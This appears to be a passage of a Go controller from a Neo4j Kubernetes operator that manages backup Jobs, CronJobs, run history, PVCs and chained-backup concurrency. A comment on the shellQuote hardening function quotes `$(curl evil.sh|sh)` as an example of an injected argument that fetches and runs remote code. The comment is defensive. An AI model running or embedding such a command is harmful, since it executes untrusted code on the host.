/*
Copyright 2025.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package controller

import (
	"context"
	stderrors "errors"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/record"
	"k8s.io/client-go/util/retry"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/controller"
	"sigs.k8s.io/controller-runtime/pkg/controller/controllerutil"
	"sigs.k8s.io/controller-runtime/pkg/log"

	neo4jv1beta1 "github.com/neo4j-partners/neo4j-kubernetes-operator/api/v1beta1"
	"github.com/neo4j-partners/neo4j-kubernetes-operator/internal/metrics"
	"github.com/neo4j-partners/neo4j-kubernetes-operator/internal/neo4j"
	"github.com/neo4j-partners/neo4j-kubernetes-operator/internal/resources"
	"github.com/neo4j-partners/neo4j-kubernetes-operator/internal/validation"
)

// Neo4jBackupReconciler reconciles a Neo4jBackup object
type Neo4jBackupReconciler struct {
	client.Client
	Scheme                  *runtime.Scheme
	Recorder                record.EventRecorder
	MaxConcurrentReconciles int
	RequeueAfter            time.Duration

	// Clientset is the typed Kubernetes client used for pod-log fetches
	// (BackupRun.ShardArtifacts filename/size population, BackupRun.Validation
	// from `neo4j-admin backup validate` output). Optional — when nil the
	// log-parsing features short-circuit and leave the corresponding status
	// fields empty rather than failing the reconcile. Production wiring sets
	// this in cmd/main.go via kubernetes.NewForConfig(mgr.GetConfig()); unit
	// tests using a fake client.Client leave it nil and the pod-log paths
	// no-op.
	Clientset kubernetes.Interface
}

const (
	// BackupFinalizer is the finalizer for Neo4j backup resources
	BackupFinalizer = "neo4j.com/backup-finalizer"
)

// +kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jbackups,verbs=get;list;watch;create;update;patch;delete
// +kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jbackups/status,verbs=get;update;patch
// +kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jbackups/finalizers,verbs=update
// +kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jenterpriseclusters,verbs=get;list;watch
// +kubebuilder:rbac:groups=batch,resources=jobs,verbs=get;list;watch;create;update;patch;delete
// +kubebuilder:rbac:groups=batch,resources=cronjobs,verbs=get;list;watch;create;update;patch;delete
// +kubebuilder:rbac:groups="",resources=persistentvolumeclaims,verbs=get;list;watch;create;update;patch
// +kubebuilder:rbac:groups="",resources=secrets,verbs=get;list;watch
// +kubebuilder:rbac:groups="",resources=events,verbs=create;patch

func GetTestRequeueAfter() time.Duration {
	if os.Getenv("TEST_MODE") == "true" {
		return time.Second
	}
	return 30 * time.Second
}

//+kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jbackups,verbs=get;list;watch;create;update;patch;delete
//+kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jbackups/status,verbs=get;update;patch
//+kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jbackups/finalizers,verbs=update
//+kubebuilder:rbac:groups=neo4j.neo4j.com,resources=neo4jenterpriseclusters,verbs=get;list;watch
//+kubebuilder:rbac:groups=batch,resources=jobs,verbs=get;list;watch;create;update;patch;delete
//+kubebuilder:rbac:groups=batch,resources=cronjobs,verbs=get;list;watch;create;update;patch;delete
//+kubebuilder:rbac:groups="",resources=serviceaccounts,verbs=get;list;watch;create;update;patch;delete
//+kubebuilder:rbac:groups=rbac.authorization.k8s.io,resources=roles,verbs=get;list;watch;create;update;patch;delete
//+kubebuilder:rbac:groups=rbac.authorization.k8s.io,resources=rolebindings,verbs=get;list;watch;create;update;patch;delete
// Note: pods/exec RBAC was historically declared here for the old
// sidecar-exec backup architecture. That architecture was replaced by
// Job-based backups (see docs/plans/2026-02-20-backup-restore-overhaul.md)
// and no code path uses pods/exec anymore. Removed to reduce blast
// radius per the November 2025 security review.
//+kubebuilder:rbac:groups="",resources=pods/log,verbs=get

// Reconcile handles the reconciliation of Neo4jBackup resources
func (r *Neo4jBackupReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {
	logger := log.FromContext(ctx)

	// Fetch the Neo4jBackup instance
	backup := &neo4jv1beta1.Neo4jBackup{}
	if err := r.Get(ctx, req.NamespacedName, backup); err != nil {
		if errors.IsNotFound(err) {
			logger.Info("Neo4jBackup resource not found")
			return ctrl.Result{}, nil
		}
		logger.Error(err, "Failed to get Neo4jBackup")
		return ctrl.Result{}, err
	}

	// Handle deletion
	if backup.DeletionTimestamp != nil {
		return r.handleDeletion(ctx, backup)
	}

	// Add finalizer if not present
	if !controllerutil.ContainsFinalizer(backup, BackupFinalizer) {
		controllerutil.AddFinalizer(backup, BackupFinalizer)
		if err := r.Update(ctx, backup); err != nil {
			logger.Error(err, "Failed to add finalizer")
			return ctrl.Result{}, err
		}
		return ctrl.Result{Requeue: true}, nil
	}

	// Get target cluster
	targetCluster, err := r.getTargetCluster(ctx, backup)
	if err != nil {
		logger.Error(err, "Failed to get target cluster")
		r.updateBackupStatus(ctx, backup, "Failed", fmt.Sprintf("Failed to get target cluster: %v", err))
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, err
	}

	// Validate Neo4j version compatibility (5.26+ or 2025.01+)
	if err := r.validateNeo4jVersion(targetCluster); err != nil {
		logger.Error(err, "Neo4j version validation failed")
		r.updateBackupStatus(ctx, backup, "Failed", fmt.Sprintf("Neo4j version not supported: %v", err))
		return ctrl.Result{}, err
	}

	// Check if cluster is ready
	if !r.isClusterReady(targetCluster) {
		r.updateBackupStatus(ctx, backup, "Waiting", "Target cluster is not ready")
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
	}

	// suspend applies to BOTH scheduled and one-time backups. Checking here
	// (above the schedule branch) keeps the semantics consistent — historically
	// the check lived inside handleScheduledBackup, so suspend=true was a no-op
	// for one-time backups (issue #116).
	if backup.Spec.Suspend {
		r.updateBackupStatus(ctx, backup, "Suspended", "Backup is suspended")
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
	}

	// Sharded-DB-specific static preflight (cluster sharding enabled, version
	// gate, Neo4jShardedDatabase CR exists + Ready, clusterRef matches). No-op
	// for non-ShardedDatabase kinds. The expensive glob-safety SHOW DATABASES
	// check fires later, only at Job creation time.
	if done, result, preflightErr := r.applyShardedPreflight(ctx, backup, targetCluster); done {
		return result, preflightErr
	}

	// Handle scheduled backups
	if backup.Spec.Schedule != "" {
		return r.handleScheduledBackup(ctx, backup, targetCluster)
	}

	// Handle one-time backup
	return r.handleOneTimeBackup(ctx, backup, targetCluster)
}

func (r *Neo4jBackupReconciler) handleDeletion(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) (ctrl.Result, error) {
	logger := log.FromContext(ctx)

	if !controllerutil.ContainsFinalizer(backup, BackupFinalizer) {
		return ctrl.Result{}, nil
	}

	// Clean up backup jobs
	if err := r.cleanupBackupJobs(ctx, backup); err != nil {
		logger.Error(err, "Failed to cleanup backup jobs")
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, err
	}

	// Clean up backup artifacts (if retention policy requires it)
	if err := r.cleanupBackupArtifacts(ctx, backup); err != nil {
		logger.Error(err, "Failed to cleanup backup artifacts")
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, err
	}

	// Remove finalizer
	controllerutil.RemoveFinalizer(backup, BackupFinalizer)
	return ctrl.Result{}, r.Update(ctx, backup)
}

func (r *Neo4jBackupReconciler) handleScheduledBackup(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, cluster *neo4jv1beta1.Neo4jEnterpriseCluster) (ctrl.Result, error) {
	logger := log.FromContext(ctx)

	// Ensure backup ServiceAccount exists (and carries workload-identity annotations).
	if err := r.ensureBackupServiceAccount(ctx, backup); err != nil {
		logger.Error(err, "Failed to ensure backup ServiceAccount")
		return ctrl.Result{}, err
	}

	// Create or update CronJob for scheduled backups
	cronJob, err := r.createBackupCronJob(ctx, backup, cluster)
	if err != nil {
		logger.Error(err, "Failed to create backup CronJob")
		r.updateBackupStatus(ctx, backup, "Failed", fmt.Sprintf("Failed to create CronJob: %v", err))
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, err
	}

	// Update status
	r.updateBackupStatus(ctx, backup, "Scheduled", "Backup scheduled with CronJob "+cronJob.Name)
	r.Recorder.Event(backup, corev1.EventTypeNormal, EventReasonBackupScheduled, "Backup scheduled with CronJob "+cronJob.Name)

	// Record any completed CronJob child Jobs in status.history. Non-fatal —
	// a failure to update history must not block scheduled backup
	// reconciliation. Issue #118.
	if err := r.reconcileScheduledHistory(ctx, backup); err != nil {
		logger.Error(err, "Failed to update scheduled backup history")
	}

	return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
}

// reconcileScheduledHistory scans Jobs spawned by this backup's CronJob and
// appends a BackupRun entry for any completed Job not yet present in
// status.history. Required because the CronJob's child Jobs are owned by the
// CronJob (not the Neo4jBackup CR), so the controller's `Owns(&batchv1.Job{})`
// wiring does not fire on them and recordOneShotBackupRun — which is called from
// handleExistingBackupJob — is unreachable for the scheduled path. Issue #118.
func (r *Neo4jBackupReconciler) reconcileScheduledHistory(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	var jobs batchv1.JobList
	if err := r.List(ctx, &jobs,
		client.InNamespace(backup.Namespace),
		client.MatchingLabels{"app.kubernetes.io/instance": backup.Name}); err != nil {
		return err
	}

	// Track newly-recorded Succeeded runs so we can fire the Phase 3
	// reverse-lookup (Neo4jShardedDatabase.status.lastBackup) AFTER the
	// status.history write commits — emitting before the commit would race
	// against the same-CR resource-version churn.
	var newSucceededRuns []neo4jv1beta1.BackupRun

	update := func() error {
		latest := &neo4jv1beta1.Neo4jBackup{}
		if err := r.Get(ctx, client.ObjectKeyFromObject(backup), latest); err != nil {
			return err
		}

		newSucceededRuns = nil // reset on every retry
		changed := false
		// Compute the expected sharded artifact list once per outer call (the
		// answer doesn't depend on the Job; it depends on the sharded DB CR).
		// No-op + nil for non-sharded backups.
		shardArtifacts := r.expectedShardArtifactsForBackup(ctx, latest)
		for i := range jobs.Items {
			job := &jobs.Items[i]
			run, ok := jobToBackupRun(job, chainRoot(latest))
			if !ok {
				continue // still running
			}
			if backupRunAlreadyRecorded(latest.Status.History, run) {
				continue
			}
			// F3 / F4: augment with per-Job filename/size + validation
			// from the Job's pod logs. Each CronJob child has its own Pod
			// with its own log, so we fetch per-Job rather than once per
			// outer call. Errors non-fatal — empty fields still leave the
			// ShardName audit list populated.
			isStandardDB := latest.Spec.Target.Kind == neo4jv1beta1.BackupTargetKindDatabase
			var jobLog string
			if len(shardArtifacts) > 0 || isStandardDB ||
				(latest.Spec.Options != nil && latest.Spec.Options.Validate != nil && *latest.Spec.Options.Validate) {
				if got, logErr := r.fetchBackupPodLog(ctx, job.Name, job.Namespace); logErr == nil {
					jobLog = got
				}
			}
			if len(shardArtifacts) > 0 {
				perJobArtifacts := shardArtifacts
				if jobLog != "" {
					perJobArtifacts = mergeShardArtifactsFromLog(shardArtifacts, parseShardArtifactsFromLog(jobLog))
				}
				run.ShardArtifacts = perJobArtifacts
			}
			if isStandardDB && jobLog != "" {
				run.ArtifactFilename = parseStandardArtifactFromLog(jobLog, latest.Spec.Target.Name)
			}
			if jobLog != "" {
				if validation := parseValidationFromLog(jobLog); validation != nil {
					run.Validation = validation
				}
			}
			latest.Status.History = append(latest.Status.History, run)
			changed = true
			if run.Status == "Succeeded" {
				newSucceededRuns = append(newSucceededRuns, run)
			}
		}
		if !changed {
			return nil
		}

		// Sort newest-first by StartTime to match the one-time-backup path's
		// ordering (which prepends), then cap at 10 entries.
		sortBackupRunsNewestFirst(latest.Status.History)
		if len(latest.Status.History) > 10 {
			latest.Status.History = latest.Status.History[:10]
		}

		return r.Status().Update(ctx, latest)
	}
	if err := retry.RetryOnConflict(retry.DefaultBackoff, update); err != nil {
		return err
	}

	// Phase 3: reverse-lookup so the Neo4jShardedDatabase CR's
	// status.lastBackup surfaces the most recent succeeded scheduled run. Use
	// the most-recently-completed run (sortBackupRunsNewestFirst ordering
	// would lose ties from same-second StartTimes; sort the newly-recorded
	// subset by CompletionTime and pick the last). No-op for non-sharded.
	if len(newSucceededRuns) > 0 {
		latestRun := newSucceededRuns[0]
		for _, r := range newSucceededRuns[1:] {
			if r.CompletionTime != nil && (latestRun.CompletionTime == nil || r.CompletionTime.After(latestRun.CompletionTime.Time)) {
				latestRun = r
			}
		}
		r.updateShardedDBLastBackup(ctx, backup, latestRun)
	}
	return nil
}

// sortBackupRunsNewestFirst orders history newest-first by StartTime, with
// RunID as a deterministic tie-breaker for entries whose StartTime is equal
// (e.g. two CronJob children spawned at the same instant, or several entries
// with zero StartTime from edge cases where a Job ended before its StartTime
// was written). Without the tie-breaker the cap-at-10 in
// reconcileScheduledHistory could drop different entries on different
// reconciles when StartTime collisions are present.
//
// RunID descending (lexicographic) is the chosen tie-break direction; UID
// has no semantic ordering anyway, we just need *some* total order, and
// "higher string sorts to the top" keeps the function's contract uniform
// (newest first → if you can't tell which is newest, pick the
// lexicographically-larger UID).
func sortBackupRunsNewestFirst(runs []neo4jv1beta1.BackupRun) {
	sort.Slice(runs, func(i, j int) bool {
		a, b := runs[i], runs[j]
		if a.StartTime.Equal(&b.StartTime) {
			return a.RunID > b.RunID
		}
		return a.StartTime.After(b.StartTime.Time)
	})
}

// jobToBackupRun builds a BackupRun for a completed Job. Returns ok=false if
// the Job has not finished (neither Succeeded nor Failed > 0).
//
// `backupsPath` is the per-CR artifact directory (relative to storage
// root) — same for every run of one CR under the shared-directory layout
// (rule 40). Pass the Neo4jBackup CR name; jobToBackupRun records it as
// `BackupRun.BackupsPath` for audit + sharded-seed-proxy URL building.
// The Job UID still uniquely identifies the run via `BackupRun.RunID`.
func jobToBackupRun(job *batchv1.Job, backupsPath string) (neo4jv1beta1.BackupRun, bool) {
	run := neo4jv1beta1.BackupRun{
		RunID:       string(job.UID),
		BackupsPath: backupsPath,
	}
	if job.Status.StartTime != nil {
		run.StartTime = *job.Status.StartTime
	}
	run.CompletionTime = job.Status.CompletionTime

	switch {
	case job.Status.Succeeded > 0:
		run.Status = "Succeeded"
		if job.Status.StartTime != nil && job.Status.CompletionTime != nil {
			run.Stats = &neo4jv1beta1.BackupStats{
				Duration: job.Status.CompletionTime.Sub(job.Status.StartTime.Time).Round(time.Second).String(),
			}
		}
		return run, true
	case job.Status.Failed > 0:
		run.Status = "Failed"
		return run, true
	default:
		return run, false
	}
}

// backupRunAlreadyRecorded reports whether a BackupRun with the same RunID is
// already in history. RunID comes from the Job's metadata.uid which is unique
// and stable per Job, so this is a reliable dedup key.
func backupRunAlreadyRecorded(history []neo4jv1beta1.BackupRun, run neo4jv1beta1.BackupRun) bool {
	if run.RunID == "" {
		return false
	}
	for _, existing := range history {
		if existing.RunID == run.RunID {
			return true
		}
	}
	return false
}

func (r *Neo4jBackupReconciler) handleOneTimeBackup(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, cluster *neo4jv1beta1.Neo4jEnterpriseCluster) (ctrl.Result, error) {
	logger := log.FromContext(ctx)

	// One-time backups are terminal once Completed or Failed. Without this
	// guard the controller would re-create a fresh Job every time the
	// successful Job's TTLSecondsAfterFinished expires and the Job is GC'd
	// (the OwnerReference watch fires a reconcile, the existing-Job lookup
	// below returns NotFound, and the controller assumes "no Job yet, create
	// one"). To retry a Failed one-time backup, delete and recreate the CR.
	// Issue #116.
	if backup.Status.Phase == "Completed" || backup.Status.Phase == "Failed" {
		return ctrl.Result{}, nil
	}

	// Ensure backup ServiceAccount exists (and carries workload-identity annotations).
	if err := r.ensureBackupServiceAccount(ctx, backup); err != nil {
		logger.Error(err, "Failed to ensure backup ServiceAccount")
		return ctrl.Result{}, err
	}

	// Check if backup job already exists
	jobName := backup.Name + "-backup"
	existingJob := &batchv1.Job{}
	err := r.Get(ctx, types.NamespacedName{Name: jobName, Namespace: backup.Namespace}, existingJob)

	if err == nil {
		// Job exists, check its status
		return r.handleExistingBackupJob(ctx, backup, existingJob)
	}

	if !errors.IsNotFound(err) {
		logger.Error(err, "Failed to get backup job")
		return ctrl.Result{}, err
	}

	// Create backup job
	job, err := r.createBackupJob(ctx, backup, cluster)
	if err != nil {
		// errChainBusy is transient — another CR sharing the chain
		// (parent or sibling chainFromBackup) is still running. Route to
		// Pending and requeue rather than terminal Failed.
		if stderrors.Is(err, errChainBusy) {
			logger.Info("Backup waiting for chained CR to finish", "error", err.Error())
			r.updateBackupStatus(ctx, backup, "Pending", err.Error())
			return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
		}
		logger.Error(err, "Failed to create backup job")
		r.updateBackupStatus(ctx, backup, "Failed", fmt.Sprintf("Failed to create backup job: %v", err))
		return ctrl.Result{RequeueAfter: r.RequeueAfter}, err
	}

	// Update status
	r.updateBackupStatus(ctx, backup, "Running", fmt.Sprintf("Backup job %s created", job.Name))
	r.Recorder.Event(backup, corev1.EventTypeNormal, EventReasonBackupStarted, fmt.Sprintf("Backup job %s started", job.Name))

	return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
}

func (r *Neo4jBackupReconciler) handleExistingBackupJob(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, job *batchv1.Job) (ctrl.Result, error) {
	backupM := metrics.NewBackupMetrics(backup.Name, backup.Namespace)

	// Check job status
	if job.Status.Succeeded > 0 {
		// Backup completed successfully
		r.updateBackupStatus(ctx, backup, "Completed", "Backup completed successfully")
		r.Recorder.Event(backup, corev1.EventTypeNormal, EventReasonBackupCompleted, "Backup completed successfully")
		backupM.RecordBackup(ctx, true, jobDuration(job), 0)

		// Append the run to status.history + refresh status.stats summary
		r.recordOneShotBackupRun(ctx, backup, job)

		return ctrl.Result{}, nil
	}

	if job.Status.Failed > 0 {
		// Backup failed — flip phase AND record the failed run in
		// status.history (recheck gap 2). Before this, failed one-shot
		// Jobs flipped phase=Failed but never appeared in history, so the
		// only signal of past failures was the metrics counter and the
		// transient Job object (which TTL'd out after 5 minutes).
		r.updateBackupStatus(ctx, backup, "Failed", "Backup job failed")
		r.Recorder.Event(backup, corev1.EventTypeWarning, EventReasonBackupFailed, "Backup job failed")
		backupM.RecordBackup(ctx, false, jobDuration(job), 0)
		r.recordOneShotBackupRun(ctx, backup, job)
		return ctrl.Result{}, nil
	}

	// Job is still running
	r.updateBackupStatus(ctx, backup, "Running", "Backup job is running")
	return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
}

// shellQuote single-quotes a string for safe inclusion in a /bin/sh -c
// command. Single quotes disable every shell metacharacter except the
// single quote itself, so `'foo'` is literal `foo` even if the string
// contains $, `, ;, &, |, *, etc.
//
// Embedded single quotes are handled with the classic Bourne idiom:
// close the quoted run, emit an escaped quote, reopen — `'\”`.
//
// Used for backup.Spec.Options.AdditionalArgs (issue #117-adjacent
// hardening): values flow directly into a /bin/sh -c command, so an
// argument like `$(curl evil.sh|sh)` would otherwise be executed by
// the shell. strconv.Quote is NOT a substitute — it emits Go-syntax
// double-quoted strings, which still allow shell variable expansion.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// jobDuration reports how long the backup Job ran for. Both metrics
// (RecordBackup) and history (BackupStats.Duration) need this; deriving from
// time.Now() at reconcile entry is wrong because the reconcile that observes
// Succeeded/Failed runs some time after the Job actually finished, so the
// elapsed wall-clock is just the reconcile cost (issue #117-adjacent: a
// completed Job's "duration" metric was reporting milliseconds).
//
// Falls back to time.Since(StartTime) when CompletionTime is missing — covers
// the rare case where a Job is observed Failed mid-run before its
// CompletionTime is written. Returns 0 if StartTime is also missing.
func jobDuration(job *batchv1.Job) time.Duration {
	if job == nil || job.Status.StartTime == nil {
		return 0
	}
	if job.Status.CompletionTime != nil {
		return job.Status.CompletionTime.Sub(job.Status.StartTime.Time)
	}
	return time.Since(job.Status.StartTime.Time)
}

// backupTargetName resolves the Neo4j instance name from a backup spec.
// For database-scoped kinds (Database, ShardedDatabase) the target Name is the
// database name and ClusterRef holds the actual Neo4j instance.
func backupTargetName(backup *neo4jv1beta1.Neo4jBackup) string {
	if neo4jv1beta1.IsDatabaseScopedBackupKind(backup.Spec.Target.Kind) && backup.Spec.Target.ClusterRef != "" {
		return backup.Spec.Target.ClusterRef
	}
	return backup.Spec.Target.Name
}

// backupLabels returns the standard label set for a Neo4jBackup workload, ready to
// be applied identically at the CronJob/Job level and both template levels.
func backupLabels(backup *neo4jv1beta1.Neo4jBackup, component string) map[string]string {
	return map[string]string{
		"app.kubernetes.io/name":       "neo4j-backup",
		"app.kubernetes.io/instance":   backup.Name,
		"app.kubernetes.io/component":  component,
		"app.kubernetes.io/managed-by": "neo4j-operator",
		// part-of identifies the chain root — same value for every CR
		// chained off this one. Used by waitForChainConcurrencyClear to
		// block a Job submission while another Job in the same chain is
		// still active.
		"app.kubernetes.io/part-of": chainRoot(backup),
		"neo4j.com/backup-target":   backupTargetName(backup),
	}
}

// ensureTempStagingPVC creates a PVC for temporary staging if tempStorage is configured.
// The PVC is owned by the backup/restore CR and garbage-collected when the CR is deleted.
func (r *Neo4jBackupReconciler) ensureTempStagingPVC(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	if backup.Spec.Options == nil || backup.Spec.Options.TempStorage == nil {
		return nil
	}
	pvcName := backup.Name + "-temp-staging"
	pvc := &corev1.PersistentVolumeClaim{}
	if err := r.Get(ctx, types.NamespacedName{Name: pvcName, Namespace: backup.Namespace}, pvc); err == nil {
		return nil // PVC already exists
	} else if !errors.IsNotFound(err) {
		// Transient API errors mustn't fall through to Create — that would
		// cause spurious AlreadyExists / repeated transient failures. Bubble
		// up so the caller's RetryOnConflict / RequeueAfter handles it.
		return fmt.Errorf("failed to get temp staging PVC %s/%s: %w", backup.Namespace, pvcName, err)
	}

	pvc = &corev1.PersistentVolumeClaim{
		ObjectMeta: metav1.ObjectMeta{
			Name:      pvcName,
			Namespace: backup.Namespace,
		},
		Spec: corev1.PersistentVolumeClaimSpec{
			AccessModes: []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
			Resources: corev1.VolumeResourceRequirements{
				Requests: corev1.ResourceList{
					corev1.ResourceStorage: resource.MustParse(backup.Spec.Options.TempStorage.Size),
				},
			},
		},
	}
	if backup.Spec.Options.TempStorage.StorageClassName != "" {
		pvc.Spec.StorageClassName = &backup.Spec.Options.TempStorage.StorageClassName
	}
	if err := controllerutil.SetControllerReference(backup, pvc, r.Scheme); err != nil {
		return fmt.Errorf("failed to set owner reference on temp PVC: %w", err)
	}
	return r.Create(ctx, pvc)
}

// ensureBackupPVC provisions the destination backup PVC for storage.type=pvc
// when the user has specified `storage.pvc.size` (and optionally
// `storage.pvc.storageClassName`). If the PVC already exists (or `size` is
// empty — user is referencing a pre-existing PVC), this is a no-op.
//
// The PVC is owned by the Neo4jBackup CR so it's GC'd when the CR is
// deleted. To retain backups beyond CR lifetime, users should either
// (a) pre-create the PVC themselves so the operator finds it existing,
// or (b) leave `size` empty and provision externally.
func (r *Neo4jBackupReconciler) ensureBackupPVC(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	if backup.Spec.Storage.Type != "pvc" {
		return nil
	}
	if backup.Spec.Storage.PVC == nil || backup.Spec.Storage.PVC.Name == "" {
		return nil
	}
	if backup.Spec.Storage.PVC.Size == "" {
		// User is referencing an externally-provisioned PVC; nothing for
		// the operator to do.
		return nil
	}

	pvcName := backup.Spec.Storage.PVC.Name
	existing := &corev1.PersistentVolumeClaim{}
	if err := r.Get(ctx, types.NamespacedName{Name: pvcName, Namespace: backup.Namespace}, existing); err == nil {
		return nil // PVC already exists
	} else if !errors.IsNotFound(err) {
		return fmt.Errorf("failed to get backup PVC %s/%s: %w", backup.Namespace, pvcName, err)
	}

	pvc := &corev1.PersistentVolumeClaim{
		ObjectMeta: metav1.ObjectMeta{
			Name:      pvcName,
			Namespace: backup.Namespace,
		},
		Spec: corev1.PersistentVolumeClaimSpec{
			AccessModes: []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
			Resources: corev1.VolumeResourceRequirements{
				Requests: corev1.ResourceList{
					corev1.ResourceStorage: resource.MustParse(backup.Spec.Storage.PVC.Size),
				},
			},
		},
	}
	if backup.Spec.Storage.PVC.StorageClassName != "" {
		pvc.Spec.StorageClassName = &backup.Spec.Storage.PVC.StorageClassName
	}
	if err := controllerutil.SetControllerReference(backup, pvc, r.Scheme); err != nil {
		return fmt.Errorf("failed to set owner reference on backup PVC: %w", err)
	}
	return r.Create(ctx, pvc)
}

// errChainBusy is returned by waitForChainConcurrencyClear when another
// Job belonging to the same chain is still active. Callers route to
// Pending+requeue rather than failing.
var errChainBusy = fmt.Errorf("another backup in this chain is still running")

// validateChainParent enforces cross-CR consistency for a backup with
// spec.chainFromBackup set:
//   - the named parent CR must exist in the same namespace
//   - both CRs must target the same cluster + database (a chain that
//     pulled artifacts from a different DB would be incoherent)
//   - both CRs must use the same storage backend so the directory
//     actually overlaps (s3 + s3, same bucket + path, etc.)
//
// Returns a permanent error (caller routes to Failed) when the parent
// is missing or fields diverge. Returns nil when chainFromBackup is
// empty (non-chained CR — no checks needed).
func (r *Neo4jBackupReconciler) validateChainParent(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	if backup.Spec.ChainFromBackup == "" {
		return nil
	}
	parent := &neo4jv1beta1.Neo4jBackup{}
	key := types.NamespacedName{Name: backup.Spec.ChainFromBackup, Namespace: backup.Namespace}
	if err := r.Get(ctx, key, parent); err != nil {
		return fmt.Errorf("chainFromBackup %q not found in namespace %q: %w",
			backup.Spec.ChainFromBackup, backup.Namespace, err)
	}
	if parent.Spec.Target.Kind != backup.Spec.Target.Kind ||
		parent.Spec.Target.Name != backup.Spec.Target.Name ||
		parent.Spec.Target.ClusterRef != backup.Spec.Target.ClusterRef {
		return fmt.Errorf("chainFromBackup %q targets {kind=%q name=%q clusterRef=%q} but this backup targets {kind=%q name=%q clusterRef=%q}; chained backups must share the same target",
			parent.Name, parent.Spec.Target.Kind, parent.Spec.Target.Name, parent.Spec.Target.ClusterRef,
			backup.Spec.Target.Kind, backup.Spec.Target.Name, backup.Spec.Target.ClusterRef)
	}
	if parent.Spec.Storage.Type != backup.Spec.Storage.Type ||
		parent.Spec.Storage.Bucket != backup.Spec.Storage.Bucket ||
		parent.Spec.Storage.Path != backup.Spec.Storage.Path {
		return fmt.Errorf("chainFromBackup %q uses storage {type=%q bucket=%q path=%q} but this backup uses {type=%q bucket=%q path=%q}; chained backups must share the same storage location",
			parent.Name, parent.Spec.Storage.Type, parent.Spec.Storage.Bucket, parent.Spec.Storage.Path,
			backup.Spec.Storage.Type, backup.Spec.Storage.Bucket, backup.Spec.Storage.Path)
	}
	return nil
}

// waitForChainConcurrencyClear lists Jobs in the namespace labeled
// `app.kubernetes.io/part-of=<chain-root>` and reports errChainBusy if
// any has status.active > 0. Used to coordinate concurrent runs across
// chained CRs (e.g. daily FULL still running while hourly DIFF wants
// to fire) — without this guard two backups can write to the same
// directory simultaneously, which neo4j-admin's chain detection
// doesn't tolerate.
//
// Single-CR concurrency is still handled by `CronJob.concurrencyPolicy:
// Forbid` on the scheduled path; this helper covers the across-CR case
// that Kubernetes doesn't natively coordinate.
func (r *Neo4jBackupReconciler) waitForChainConcurrencyClear(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	jobs := &batchv1.JobList{}
	if err := r.List(ctx, jobs,
		client.InNamespace(backup.Namespace),
		client.MatchingLabels{
			"app.kubernetes.io/managed-by": "neo4j-operator",
			"app.kubernetes.io/component":  "backup",
			"app.kubernetes.io/part-of":    chainRoot(backup),
		},
	); err != nil {
		return fmt.Errorf("list chained backup Jobs: %w", err)
	}
	for i := range jobs.Items {
		if jobs.Items[i].Status.Active > 0 {
			return fmt.Errorf("Job %q (chain root %q): %w",
				jobs.Items[i].Name, chainRoot(backup), errChainBusy)
		}
	}
	return nil
}

func (r *Neo4jBackupReconciler) createBackupJob(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, cluster *neo4jv1beta1.Neo4jEnterpriseCluster) (*batchv1.Job, error) {
	// Glob-safety check for sharded backups: refuse to submit a Job whose
	// `{name}*` neo4j-admin glob would also pull in unrelated databases. No-op
	// for non-sharded kinds.
	if err := r.shardedPreflightGlobSafety(ctx, backup, cluster); err != nil {
		return nil, err
	}

	// Cross-CR consistency check for chainFromBackup. Returns a permanent
	// error when the parent CR is missing or target/storage diverges —
	// caller routes to Failed.
	if err := r.validateChainParent(ctx, backup); err != nil {
		return nil, err
	}

	// Refuse to start while another Job in the same chain (parent or
	// sibling chained CR) is still running. The caller routes
	// errChainBusy to Pending+requeue.
	if err := r.waitForChainConcurrencyClear(ctx, backup); err != nil {
		return nil, err
	}

	// Create temp staging PVC if configured
	if err := r.ensureTempStagingPVC(ctx, backup); err != nil {
		return nil, fmt.Errorf("failed to create temp staging PVC: %w", err)
	}

	// Provision the destination backup PVC when storage.type=pvc and the
	// user has specified `storage.pvc.size`. Skipped (no-op) when the PVC
